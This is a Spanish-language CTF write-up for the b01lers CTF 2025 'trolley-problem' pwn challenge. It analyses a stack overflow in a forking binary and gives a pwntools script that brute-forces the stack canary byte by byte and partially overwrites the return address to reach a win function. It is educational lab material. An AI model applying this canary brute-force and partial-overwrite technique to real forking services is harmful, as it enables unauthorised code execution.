# Trolley problem

### Analisis

```
checksec --file=chall
[*] '/home/kalcast/Temporal/Copiar/b01lers_CTF_2025/Pwn/trolley-problem/trolley-problem/src/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

El programa nos brinda una entrada de usuario, si nuestra entrada es "pull the lever" obtenemos una entrada mas, si es cualquier otra cosa obtenemos 5 entradas mas.

```
Oh no! A runaway trolley is heading down the track
and is about to cause five more trolley problems.
You can pull a lever to divert the trolley onto another track,
where it will only cause one trolley problem. What do you do?
whatever

You did nothing. Isn't that the wrong choice though?
Uh oh, here comes another trolley...

Oh no! A runaway trolley is heading down the track
and is about to cause five more trolley problems.
You can pull a lever to divert the trolley onto another track,
where it will only cause one trolley problem. What do you do?
pull the lever

You pulled the lever. But what did it accomplish?
Uh oh, here comes another trolley...

Oh no! A runaway trolley is heading down the track
and is about to cause five more trolley problems.
You can pull a lever to divert the trolley onto another track,
where it will only cause one trolley problem. What do you do?
AAAAAAAABBBBBBBBCCCCCCCC1

You did nothing. Isn't that the wrong choice though?
*** stack smashing detected ***: terminated

Oh no! A runaway trolley is heading down the track
and is about to cause five more trolley problems.
You can pull a lever to divert the trolley onto another track,
where it will only cause one trolley problem. What do you do?
```

En fin, hay un buffer overflow con un offset de 24 bytes como se puede observar, el mensaje "Uh oh, here comes another trolley..." es cambiado por "*** stack smashing detected ***: terminated" si esto ocurre. No ganamos entradas extra si hacemos esto.

Pasa lo siguiente: el programa crea un fork, el hijo rompe el bucle y llama a sym.trolley_problem(), el padre espera a que el hijo retorne un valor (1 o 5) con waitpid():

``` C
    while( true ) {
        if ((*0x5582d4f64068 & *0x5582d4f64068) < 1) {
            return 0;
        }
        *0x5582d4f64068 = *0x5582d4f64068 + -1;
        *(puVar6 + -8) = 0x5582d4f61363;
        iStack_10 = sym.imp.fork();
        if (iStack_10 == 0) break;
        iVar1 = iStack_10;
        puVar5 = puVar6 + -8;
        *(puVar6 + -8) = 0x5582d4f61382;
        sym.imp.waitpid(iVar1, &stack0xffffffffffffffec, 0);
        puVar4 = puVar6 + 0;
        uStack_c = iStack_14 >> 8 & 0xff;
        if ((uStack_c == 1) || (puVar6 = puVar6 + 0,  uStack_c == 5)) {
            *0x5582d4f64068 = uStack_c + *0x5582d4f64068;
            *puVar5 = 0x5582d4f613bc;
            sym.imp.puts("Uh oh, here comes another trolley...");
            puVar6 = puVar4;
        }
    }
    *(puVar6 + -8) = 0x5582d4f613c3;
    uVar2 = sym.trolley_problem();
    return uVar2;
}
```

Si el hijo retorna alguno de estos aumenta  `*0x5582d4f64068`, que si llega a cero se termina el programa:
``` C
  if ((*0x5582d4f64068 & *0x5582d4f64068) < 1) {
            return 0;
        }
```

### Exploit

Todos los hijos creados con fork() tienen el mismo ASLR y canario. Podemos hacerle fuerza bruta al canario y luego aprovechando que sym.win y sym.main solo suelen diferir en 2 o 3 bytes por su desplazamiento podemos sobreescribir la direccion de retorno de forma parcial.

Aspectos a tener en cuenta: 
- `En caso de que el canario contenga un byte 0xa se generara un falso negativo`
- `Si sym.main y sym.trolley_problems difieren en mas de 2 bytes la sobreescitura falla`

Pero esto es algo sobrepasable considerando que es poco probable y en un par de intentos podemos lograrlo:

``` python
from pwn import *
elf = context.binary = ELF("./chall")
io = process("./chall")
#io = remote("trolley-problem.harkonnen.b01lersc.tf",8443,sni=True,ssl=True)


def brute_force_canary():
    # Generate problems
    problems = 256*8 // 5
    for i in range(problems):
        io.sendline(b"I want problems!")
        io.recvuntil(b"you do?")
        print(f"Generating problems [{i+1}/{problems}]")
    io.recvuntil(b"you do?")
    # Find canary
    canary = b"\x00"
    known_bytes = 1
    while known_bytes < 8:
        for byte in range(256):
            if byte == 0xa:
                continue
            payload = flat(b"A"*24,canary,bytes([byte]))
            io.sendline(payload)
            for i in range(3):
                io.recvline()
            lines = io.recvuntil(b"you do?")
            if b'Uh oh' in lines:
                print(f"Updating canary: {canary}")
                canary += bytes([byte])
                break
        known_bytes+=1
    return canary

def checkCanary(io,canary) -> bool:
    print("Checking canary")
    io.sendline(flat(b"A"*24,canary))
    for i in range(3):
     io.recvline()
    lines = io.recvuntil(b"you do?")
    if b'Uh oh' in lines:
        print("Canary found")
        return True
    print("Wrong canary, maybe a false positive?")
    return False


# Paso 1: Fuerza bruta del canary
canary = brute_force_canary()
assert checkCanary(io,canary)
# Paso 2: Sobreescritura parcial
payload = flat(
            b"A"*24,
            canary,
            b"A"*8,
            p8(elf.sym.win & 0xFF)
        )
io.sendline(payload)
io.interactive()
```



